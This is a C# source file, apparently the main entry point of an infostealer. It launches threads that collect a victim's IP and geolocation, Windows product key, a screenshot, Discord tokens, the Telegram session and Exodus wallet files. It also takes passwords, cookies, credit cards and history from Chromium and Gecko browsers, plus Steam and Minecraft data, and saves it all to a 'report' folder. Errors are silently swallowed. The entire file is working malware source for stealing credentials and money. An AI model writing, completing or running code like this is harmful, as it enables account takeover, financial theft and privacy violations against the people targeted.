using System;
using System.Threading;
using System.Diagnostics;

class Program
{
    public static string[] directories = new string[]
    {
        "report",
        "report\\networking",
        "report\\system",
        "report\\social",
        "report\\browsers",
        "report\\browsers\\chromium",
        "report\\browsers\\gecko",
        "report\\wallets",
        "report\\wallets\\exodus",
        "report\\gaming"
    };

    static void Main()
    {
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;

        if (System.IO.Directory.Exists("report"))
        {
            System.IO.Directory.Delete("report", true);
        }

        foreach (string dir in directories)
        {
            System.IO.Directory.CreateDirectory(dir);
        }

        string ip = IPGrabber.GetIPAddress();

        Thread thread1 = new Thread(() =>
        {
            try
            {
                System.IO.File.WriteAllText("report\\networking\\ip_address.txt", IPGrabber.GetIPAddress());

                Thread thread1_ = new Thread(() =>
                {
                    try
                    {
                        System.IO.File.WriteAllText("report\\networking\\geo_ip_1.txt", IPGrabber.GetGeoIP1(ip));
                    }
                    catch
                    {

                    }
                });
                thread1_.Priority = ThreadPriority.Highest;
                thread1_.Start();

                Thread thread2_ = new Thread(() =>
                {
                    try
                    {
                        System.IO.File.WriteAllText("report\\networking\\geo_ip_2.txt", IPGrabber.GetGeoIP2(ip));
                    }
                    catch
                    {

                    }
                });
                thread2_.Priority = ThreadPriority.Highest;
                thread2_.Start();
            }
            catch
            {

            }
        });
        thread1.Priority = ThreadPriority.Highest;
        thread1.Start();

        Thread thread2 = new Thread(() =>
        {


            try
            {
                System.IO.File.WriteAllText("report\\system\\windows_key.txt", WindowsKeyGrabber.GetWindowsProductKeyFromRegistry());
            }
            catch
            {

            }
        });
        thread2.Priority = ThreadPriority.Highest;
        thread2.Start();

        Thread thread3 = new Thread(() =>
        {
            try
            {
                ScreenshotTaker.GetScreenshot().Save("report\\system\\screen_shot.png");
            }
            catch
            {

            }
        });
        thread3.Priority = ThreadPriority.Highest;
        thread3.Start();

        Thread thread4 = new Thread(() =>
        {
            Stopwatch stopwatch = new Stopwatch();
            stopwatch.Start();

            try
            {
                System.IO.File.WriteAllText("report\\social\\discord.txt", DiscordGrabber.GetDiscordTokens());
            }
            catch
            {

            }

            stopwatch.Stop();
            Console.WriteLine("Elapsed: " + stopwatch.ElapsedMilliseconds.ToString() + "ms");
        });
        thread4.Priority = ThreadPriority.Highest;
        thread4.Start();

        Thread thread5 = new Thread(() =>
        {
            try
            {
                System.IO.Directory.CreateDirectory("report\\social\\telegram");
                TelegramGrabber.GrabTelegramSession("report\\social\\telegram");
            }
            catch
            {

            }
        });
        thread5.Priority = ThreadPriority.Highest;
        thread5.Start();

        foreach (ChromiumBasedBrowser thing in Enum.GetValues(typeof(ChromiumBasedBrowser)))
        {
            Thread theThread = new Thread(() =>
            {
                try
                {
                    string keyPath = ChromiumGrabber.GetKeyPath(thing);
                    System.IO.Directory.CreateDirectory("report\\browsers\\chromium\\" + thing.ToString().ToLower());

                    Thread _thread1 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\chromium\\" + thing.ToString().ToLower() + "\\bookmarks.txt", ChromiumGrabber.GetBookmarks(thing));
                        }
                        catch
                        {

                        }
                    });
                    _thread1.Priority = ThreadPriority.Highest;
                    _thread1.Start();

                    Thread _thread2 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\chromium\\" + thing.ToString().ToLower() + "\\cookies.txt", ChromiumGrabber.GetCookies(thing, keyPath));
                        }
                        catch
                        {

                        }
                    });
                    _thread2.Priority = ThreadPriority.Highest;
                    _thread2.Start();

                    Thread _thread3 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\chromium\\" + thing.ToString().ToLower() + "\\credit_cards.txt", ChromiumGrabber.GetCreditCards(thing, keyPath));
                        }
                        catch
                        {

                        }
                    });
                    _thread3.Priority = ThreadPriority.Highest;
                    _thread3.Start();

                    Thread _thread4 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\chromium\\" + thing.ToString().ToLower() + "\\history.txt", ChromiumGrabber.GetHistory(thing));
                        }
                        catch
                        {

                        }
                    });
                    _thread4.Priority = ThreadPriority.Highest;
                    _thread4.Start();

                    Thread _thread5 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\chromium\\" + thing.ToString().ToLower() + "\\passwords.txt", ChromiumGrabber.GetPasswords(thing, keyPath));
                        }
                        catch
                        {

                        }
                    });
                    _thread5.Priority = ThreadPriority.Highest;
                    _thread5.Start();
                }
                catch
                {

                }
            });
            theThread.Priority = ThreadPriority.Highest;
            theThread.Start();
        }

        foreach (GeckoBasedBrowser thing in Enum.GetValues(typeof(GeckoBasedBrowser)))
        {
            Thread theThread = new Thread(() =>
            {
                try
                {
                    System.IO.Directory.CreateDirectory("report\\browsers\\gecko\\" + thing.ToString().ToLower());

                    Thread _thread1 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\gecko\\" + thing.ToString().ToLower() + "\\bookmarks.txt", GeckoGrabber.GetBookmarks(thing));
                        }
                        catch
                        {

                        }
                    });
                    _thread1.Priority = ThreadPriority.Highest;
                    _thread1.Start();

                    Thread _thread2 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\gecko\\" + thing.ToString().ToLower() + "\\cookies.txt", GeckoGrabber.GetCookies(thing));
                        }
                        catch
                        {

                        }
                    });
                    _thread2.Priority = ThreadPriority.Highest;
                    _thread2.Start();

                    Thread _thread3 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\gecko\\" + thing.ToString().ToLower() + "\\history.txt", GeckoGrabber.GetHistory(thing));
                        }
                        catch
                        {

                        }
                    });
                    _thread3.Priority = ThreadPriority.Highest;
                    _thread3.Start();

                    Thread _thread4 = new Thread(() =>
                    {
                        try
                        {
                            System.IO.File.WriteAllText("report\\browsers\\gecko\\" + thing.ToString().ToLower() + "\\passwords.txt", GeckoGrabber.GetPasswords(thing));
                        }
                        catch
                        {

                        }
                    });
                    _thread4.Priority = ThreadPriority.Highest;
                    _thread4.Start();
                }
                catch
                {

                }
            });
            theThread.Priority = ThreadPriority.Highest;
            theThread.Start();
        }

        Thread thread6 = new Thread(() =>
        {
            try
            {
                ExodusGrabber.GrabExodus("report\\wallets\\exodus");
            }
            catch
            {

            }
        });
        thread6.Priority = ThreadPriority.Highest;
        thread6.Start();

        Thread thread7 = new Thread(() =>
        {
            try
            {
                System.IO.Directory.CreateDirectory("report\\gaming\\steam");
                System.IO.Directory.CreateDirectory("report\\gaming\\steam\\config");
                SteamGrabber.GrabSteam("report\\gaming\\steam");
            }
            catch
            {

            }
        });
        thread7.Priority = ThreadPriority.Highest;
        thread7.Start();

        Thread thread8 = new Thread(() =>
        {
            try
            {
                System.IO.Directory.CreateDirectory("report\\gaming\\minecraft");
                MinecraftGrabber.GrabMinecraft("report\\gaming\\minecraft");
            }
            catch
            {

            }
        });
        thread8.Priority = ThreadPriority.Highest;
        thread8.Start();
    }
}